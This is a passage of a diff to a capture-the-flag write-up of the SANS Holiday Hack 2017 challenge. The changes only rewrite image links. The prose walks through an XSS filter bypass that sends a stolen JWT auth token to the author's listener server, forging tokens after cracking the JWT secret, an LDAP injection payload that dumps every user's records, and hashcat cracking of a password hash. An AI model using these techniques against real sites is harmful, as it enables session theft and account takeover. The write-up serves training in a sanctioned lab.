 We can see that there in fact is some filtering being done in the message portion of the service request. Technically the script is filtering anything that contains the word "__script__" in it, both lowercase and uppercase. At the same time, the line above it makes sure that the line ends with a period.
 
 So let's go ahead and click on the "__Support__" link on the login page. We should be presented with a prompt about login issues. Let's quickly fill out the form with Alabaster's infomration and a test message, like so...
 
-<a href="/images/shh74.png"><img src="/images/shh74.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh74.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh74.png"></a>
 
 Once done, let's submit that and we will see our Password Reset Request.
 
-<a href="/images/shh75.png"><img src="/images/shh75.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh75.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh75.png"></a>
 
 Alright, so that works fine. Let's go back to the form we sumbitted and try to insert some JavaScript to create a XSS Attack. I suggest you read up on some of the [XSS Bypasses](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) which will greatly help you bypass the filtering on this page.
 
@@ -1912,11 +1912,11 @@ So let's create a simple XSS Alert to test. We can inject the follow JavaScript 
 
 So our test form should like like so...
 
-<a href="/images/shh76.png"><img src="/images/shh76.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh76.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh76.png"></a>
 
 Once done, let's submit it and we should get our alert box with the words "XSS".
 
-<a href="/images/shh77.png"><img src="/images/shh77.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh77.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh77.png"></a>
 
 Perfect! We got a working XSS Attack. So all we habe to do now is access the __np-auth__ token and have it sent to our AWS EC2 Instance.
 
@@ -1926,7 +1926,7 @@ We can use the following JavaScript code to axxomplish that. Just remeber to rep
 
 So our form should look like so...
 
-<a href="/images/shh78.png"><img src="/images/shh78.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh78.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh78.png"></a>
 
 Before we send that out, let's make sure we have a listener running on our AWS EC2 Instance.
 
@@ -1953,7 +1953,7 @@ Host: 18.218.75.54:8000
 
 Perfect! So we have our token! From the looks of it, and from the hints provided to us - this is a JWT Token. To decipher this, we can go to https://jwt.io/ and just past in our token to see the decoded payload.
 
-<a href="/images/shh79.png"><img src="/images/shh79.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh79.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh79.png"></a>
 
 Taking a look at the token, we see our data and that this token belong to Alabster Snowball wgo is in the Engineering Department... but unfortuantly it's expired!
 
@@ -2015,23 +2015,23 @@ Awesome! We were able to crack the secret code for the signature which is "__3lv
 
 From here, we can go back to jwt.io and change the "__expires__" date of the JWT token, and also include our cracked secret to create a valid signature.
 
-<a href="/images/shh80.png"><img src="/images/shh80.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh80.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh80.png"></a>
 
 Once we have a valid JWT Token with an update date, we can return back to the EDB Login Page and open up our Developer Tools in our Browser. From here, we can use the __setItem__ atrribute for localStorage to set __np-auth__ with our new token.
 
-<a href="/images/shh81.png"><img src="/images/shh81.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh81.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh81.png"></a>
 
 After that token is set, refresh the page and we should be able to access Alabaster's accout.
 
-<a href="/images/shh82.png"><img src="/images/shh82.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh82.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh82.png"></a>
 
 Once we have access to the account, upon looking around we spot a "__Santa Panel__" link from the Search function.
 
-<a href="/images/shh83.png"><img src="/images/shh83.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh83.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh83.png"></a>
 
 Looking into the source code and jQuery attributes of the link, we see that we need to be in the "__administrators__" department, and we need to be Santa Claus.
 
-<a href="/images/shh84.png"><img src="/images/shh84.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh84.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh84.png"></a>
 
 ```javascript
 function(e) {
@@ -2060,7 +2060,7 @@ At this point we don't have much to work with, so we need to find a SQL injectio
 
 While browsing the page and captuirng requests and responses via Burp, I came across a very intresting note about LDAP.
 
-<a href="/images/shh85.png"><img src="/images/shh85.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh85.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh85.png"></a>
 
 An initial look at this note reveals to us the LDAP Query that is being used for the request form!
 
@@ -2068,43 +2068,43 @@ SANS actually have a very good post on [Undersanding and Exploiting Web Based LD
 
 After reading the article, the first thing I do is search for Alabster's name in the Elf Name field, while pulling up all the infomration I can from the drop down.
 
-<a href="/images/shh86.png"><img src="/images/shh86.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh86.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh86.png"></a>
 
 Captruing the Request in Burp also revleas some intresting infomration about the attribute query.
 
-<a href="/images/shh87.png"><img src="/images/shh87.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh87.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh87.png"></a>
 
 Alright, awesome we got Alabaster's information... but let's see if we can't pull out everybody's information from the database.
 
 In the SANS Blog Post, the write was able to inject `))(department=it)(|(cn=` into his query to list all the users. So let's try using that query to see if it works.
 
-<a href="/images/shh88.png"><img src="/images/shh88.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh88.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh88.png"></a>
 
 Awesome, it does work! Upon scrolling down to the bottom of the page we see Santa's Information.
 
-<a href="/images/shh89.png"><img src="/images/shh89.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh89.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh89.png"></a>
 
 Now that we have Santas Name, Email, and Department, let's return back to JWT.io and change our JWT Token so we can login as Santa.
 
-<a href="/images/shh90.png"><img src="/images/shh90.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh90.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh90.png"></a>
 
 Once again, once we have the generated token, set the token using __setItem__ in your Developer console, and refresh the page.
 
-<a href="/images/shh91.png"><img src="/images/shh91.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh91.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh91.png"></a>
 
-<a href="/images/shh92.png"><img src="/images/shh92.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh92.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh92.png"></a>
 
 Nice, so we were able to access Santas account! Unfortunatly for us we still can't access the Santa Panel as we need a password!
 
-<a href="/images/shh93.png"><img src="/images/shh93.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh93.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh93.png"></a>
 
 At this point, I opt to capture the LDAP Query request via Brup to pull all the department info. Once the request is capture, I change the attribures field to __*__ so it includes all the information.
 
-<a href="/images/shh94.png"><img src="/images/shh94.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh94.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh94.png"></a>
 
 Once we send that out, and captue the response, we can see everyones information, including Santas Password which seems to be MD5 encoded.
 
-<a href="/images/shh95.png"><img src="/images/shh95.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh95.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh95.png"></a>
 
 Now that we have Santas password hash, let's save it to a file and use HashCat to crack it.
 
@@ -2135,11 +2135,11 @@ Stopped: Thu Jan 11 15:08:24 2018
 
 Great, we cracked the password! Now that we have Santas real password, we are able to access the Letter to Santa.
 
-<a href="/images/shh96.png"><img src="/images/shh96.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh96.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh96.png"></a>
 
 After we unlock all the page, we can go back to our Stocking and see a new NPC Converstaion with Glinda the Good Witch of Oz!
 
-<a href="/images/shh97.png"><img src="/images/shh97.png"></a>
+<a href="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh97.png"><img src="https://github.com/jhalon/jhalon.github.io/tree/master/images/shh97.png"></a>
 
 ## Answers
 
